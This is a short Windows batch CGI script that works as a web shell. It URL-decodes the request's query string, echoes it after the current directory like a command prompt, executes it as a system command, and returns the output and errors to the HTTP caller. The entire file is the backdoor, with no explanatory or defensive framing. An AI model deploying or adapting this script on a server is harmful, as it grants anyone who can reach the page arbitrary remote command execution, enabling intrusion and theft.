@echo off
setlocal enabledelayedexpansion
echo "Content-Type: text/plain"
echo.
set "spc=%%20"
set "qot=%%27"
set "qtrep=^""
set "replace= "
set "QUERY_STRING=!QUERY_STRING:%spc%=%replace%!"
set "QUERY_STRING=!QUERY_STRING:%qot%=%qtrep%!"
echo %cd%^> %QUERY_STRING%


%QUERY_STRING% 2> bo.o > bo.s
type bo.o
type bo.s
del bo.o
del bo.s